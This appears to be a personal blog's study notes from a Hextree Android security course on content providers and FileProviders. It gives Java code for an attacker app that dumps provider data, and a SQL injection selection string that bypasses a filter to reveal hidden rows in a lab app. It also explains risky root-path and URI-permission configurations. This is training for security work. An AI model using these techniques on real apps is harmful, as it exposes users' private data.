---
layout: post
title: Content & File Provider
date: 2025-03-27 15:36 +0200
categories: Hextree-Android-Course
tags: android hextree
---
# **How to Access Contacts on Android?**

To learn about Content Providers, we can start by looking at the [Contacts](https://developer.android.com/identity/providers/contacts-provider/retrieve-names) stored on the phone, and how an app can access them. This is actually also implemented with a [`ContentProvider`](https://developer.android.com/reference/android/content/ContentProvider).

Content Providers are identified and accessed with a `content://` URI. Using the [`getContentResolver().query()`](https://developer.android.com/reference/android/content/ContentProvider#query(android.net.Uri,%20java.lang.String%5B%5D,%20android.os.Bundle,%20android.os.CancellationSignal)) method the URI can be querried. The returned data is a table structure that can be explored using the `Cursor` object.

```java
Cursor cursor = getContentResolver().query(ContactsContract.RawContacts.CONTENT_URI,
                null, null,
                null, null);
```

**Dump Content Provider**

```java
public void dump(Uri uri) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
    if (cursor.moveToFirst()) {
        do {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if (sb.length() > 0) {
                    sb.append(", ");
                }
                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
            }
            Log.d("evil", sb.toString());
        } while (cursor.moveToNext());
    }
}
```

Over secured also has great [articles about Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/#capturing-app-permissions).

---

# **Reverse Engineering SQLite ContentProvider**

Lots of ContentProviders are backed by a SQLite database, and the provider `query()` is often directly mapped to a SQL query.
Many Content Providers use a [`UriMatcher`](https://developer.android.com/reference/android/content/UriMatcher) to route the incoming queries to different data.

## Using adb:

```powershell
adb shell content query --uri content://<authorites>/table_name
```

## Using develop attacker app:

💡
Before we getting to query content provider for specific application, we need first to declare a `<queries>` for this application package in AndroidMainfest.xml:


```xml
<queries>
     <package android:name="Package_Name_Here"/>
</queries>
```

Then complete the code:

```java
Cursor cursor = getContentResolver().query(
   Uri.parse("content://<authorites>/table_name"), 
   null, null,
   null, null
);
// dump Uri
if (cursor!=null && cursor.moveToFirst()) {
    do {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < cursor.getColumnCount(); i++) {
            if (sb.length() > 0) {
                sb.append(", ");
            }
            sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
        }
        Log.d("dumpedData", sb.toString());
    } while (cursor.moveToNext());
}
```

---

# **SQL Injection in Content Providers**

Example on code cause SQlite error:

```java
Cursor cursor = getContentResolver().query(
        Uri.parse("content://io.hextree.flag32/flags"),
        null, "#)@#rd32",
        null, null
);
```

The Error code:

![](/Images/hextreeCourseImages/image5.png)

I noticed the our code putted in () so i bypass it via this code:

```java
Cursor cursor = getContentResolver().query(
        Uri.parse("content://io.hextree.flag32/flags"),
        null, "1=1) OR visible=0 --",
        null, null
);
```

---

# **Sharing Provider Access Permissions**

Sharing access to Content Provider is a central feature of Android. It is used all the time to give other apps access, without giving direct file access. A typical `<provider>` looks like this:

```xml
<provider
    android:name=".providers.Flag33Provider1"
    android:authorities="io.hextree.flag33_1"
    android:enabled="true"
    android:exported="false"
    android:grantUriPermissions="true" />
```

The provider is generally not exported with `android:exported="false"` but the attribute `android:grantUriPermissions="true"` is set. This means the provider cannot be directly interacted with. But the app can allow another app to query the provider, when sending an Intent with a flag such as [`GRANT_READ_URI_PERMISSION`](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_READ_URI_PERMISSION).

For example an app might start an Activity and expect a result. The target app can then share access to its content provider by returning such an Intent back to the caller class.

```java
intent.setData(Uri.parse("content://io.hextree.example/flags"));
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
setResult(RESULT_OK, intent);
```

---

# **Hijacking Content Provider Access**

While apps can intentionally share access to Content Providers, sometimes apps can also be forced to do it unintentionally.

---

# **How To Access FileProvider**

[Android Jetpack](https://developer.android.com/jetpack) (or androidx) is a commonly used official library implementing lots of useful classes. Including the widely used [`FileProvider`](https://developer.android.com/reference/androidx/core/content/package-summary).

Such a provider can easily be identified in the Android manifest where it references the `androidx.core.content.FileProvider` name.

```xml
<provider android:name="androidx.core.content.FileProvider"
          android:exported="false"
          android:authorities="io.hextree.files"
          android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
               android:resource="@xml/filepaths"/>
</provider>

```

Notable is the referenced XML file `filepaths.xml` which contains the configuration for this FileProvider.

```xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <files-path name="flag_files" path="flags/"/>
    <files-path name="other_files" path="."/>
</paths>

```

A typical URI generated for this FileProvider could look like this `content://io.hextree.files/other_files/secret.txt`. Where the sections can be read like so:

- `content://` it's a content provider
- `io.hextree.files` the authority from the android manifest
- `other_files` which configuration entry is used
- `/secret.txt` the path of the file relative to the configured `path` in the .xml file

---

# **Insecure root-path FileProvider Config**

Compare the `filepaths.xml` to the `rootpaths.xml` file provider configuration. Why is the `<root-path>` considered "insecure"?

**filepaths.xml**

```xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
		<files-path 
		name="flag_files" 
		path="flags/"/>
		<files-path 
		name="other_files" 
		path="."/>
</paths>
```

Remember that the file provider configuration is used to generate file sharing URIs such as `content://io.hextree.files/other_files/secret.txt`. These sections can be read like so:

- `content://` it's a content provider
- `io.hextree.files` the authority from the android manifest
- `other_files` which configuration entry is used
- `/secret.txt` the path of the file relative to the configured `path` in the .xml file

**rootpaths.xml**

```xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <root-path name="root_files" path="/"/>
</paths>
```

The file provider with a `<root-path>` configuration will generated URIs like this 

`content://io.hextree.files/root_files/data/data/io.hextree.attacksurface/files/secret.txt`.

 If we decode these sections we can see that this provider can map files of the entire filesystem

- `content://` it's a content provider
- `io.hextree.root` the authority from the android manifest
- `root_files` which configuration entry is used
- `/data/data/io.hextree.attacksurface/files/secret.txt` the path of the file relative to the configured `path`, which is mapped to the filesystem root!

In itself the `<root-path>` configuration is not actually insecure, as long as only trusted files are shared. But if the app allows an attacker to control the path to any file, it can be used to expose arbitrary internal files.

---

# **FileProvider Write Access**

Besides sharing content providers with read permissions, an app can also share write permissions

```java
// ...
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

```

Note that in decompiled code the integer constants `FLAG_GRANT_READ_URI_PERMISSION` are probably directly referenced. Which means:

- `addFlags(1)` = `FLAG_GRANT_READ_URI_PERMISSION`
- `addFlags(2)` = `FLAG_GRANT_WRITE_URI_PERMISSION`
- `addFlags(3)` = both `FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION`

**THANKS FOR READING ❤️**

<script src="https://giscus.app/client.js"
        data-repo="0xk3r0/0xk3r0.github.io"
        data-repo-id="R_kgDOOGw3bQ"
        data-category="General"
        data-category-id="DIC_kwDOOGw3bc4CobRY"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="dark"
        data-lang="en"
        crossorigin="anonymous"
        async>
</script>
